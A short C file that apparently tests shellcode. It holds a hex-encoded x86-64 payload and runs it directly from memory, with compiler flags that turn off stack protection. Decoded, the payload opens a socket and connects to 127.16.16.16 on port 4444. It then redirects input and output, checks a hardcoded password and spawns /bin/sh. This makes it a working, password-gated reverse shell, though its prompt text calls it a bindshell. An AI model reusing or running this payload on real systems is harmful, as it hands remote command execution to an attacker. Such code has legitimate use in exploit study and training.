#include<stdio.h>
#include<string.h>

//compile with: gcc shellcode.c -o shellcode -fno-stack-protector -z execstack

unsigned char code[] = \
"\xeb\x6f\x45\x6e\x74\x65\x72\x20\x79\x6f\x75\x72\x20\x70\x61\x73\x73\x77\x6f\x72\x64\x20\x74\x6f\x20\x72\x75\x6e\x20\x79\x6f\x75\x72\x20\x62\x69\x6e\x64\x73\x68\x65\x6c\x6c\x0a\x49\x6e\x63\x6f\x72\x72\x65\x63\x74\x20\x50\x61\x73\x73\x77\x6f\x72\x64\x0a\x59\x6f\x75\x20\x68\x61\x76\x65\x20\x73\x70\x61\x77\x6e\x20\x61\x20\x73\x68\x65\x6c\x6c\x20\x21\x0a\x48\x31\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc7\x48\x8d\x35\xc1\xff\xff\xff\xb2\x13\x0f\x05\xeb\x52\x48\x31\xc0\xb0\x29\x48\x31\xff\x40\xb7\x02\x48\x31\xf6\x40\xb6\x01\x48\x31\xd2\x0f\x05\x48\x89\xc7\x48\x31\xc0\xb0\x2a\x68\x7f\x10\x10\x10\x66\x68\x11\x5c\x66\x6a\x02\x48\x89\xe6\x48\x31\xd2\xb2\x10\x0f\x05\x48\x31\xc0\xb0\x21\x48\x31\xf6\x0f\x05\x48\x31\xc0\xb0\x21\x48\xff\xc6\x0f\x05\x48\x31\xc0\xb0\x21\x48\xff\xc6\x0f\x05\x48\x31\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc7\x48\x8d\x35\x2c\xff\xff\xff\xb2\x2a\x0f\x05\x48\x31\xc0\x48\x89\xc7\x48\x89\xc2\x48\x89\xe6\x48\x83\xc2\x08\x0f\x05\x48\x89\xe7\x48\xb8\x73\x65\x72\x65\x6e\x65\x21\x21\x48\xaf\x0f\x85\x57\xff\xff\xff\x48\x31\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc7\x48\x8d\x35\x2b\xff\xff\xff\xb2\x19\x0f\x05\x48\x31\xc0\xb0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x31\xff\x48\x89\xe7\x48\x31\xd2\x52\x48\x89\xe2\x57\x48\x89\xe6\x0f\x05";
main()
{
    printf("Shellcode Length:  %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}
